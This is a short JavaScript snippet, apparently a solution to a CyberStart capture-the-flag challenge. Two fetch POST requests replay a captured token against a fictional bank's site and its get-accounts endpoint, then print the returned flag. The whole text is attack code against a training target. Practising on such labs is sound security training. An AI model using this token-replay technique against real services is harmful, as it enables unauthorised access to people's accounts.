fetch("https://cloudninebank.com/", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site"
  },
  "referrer": "https://play.cyberstart.com/",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "token=CNcsmXX5d50ZQCG5Us4twDi18awV",
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
}).then(r => r.text()).then(t => console.log(t))

fetch("https://cloudninebank.com/get-accounts", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site"
  },
  "referrer": "https://play.cyberstart.com/",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "token=CNcsmXX5d50ZQCG5Us4twDi18awV",
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
}).then(r => r.json()).then(t => console.log(t['data']['flag']))
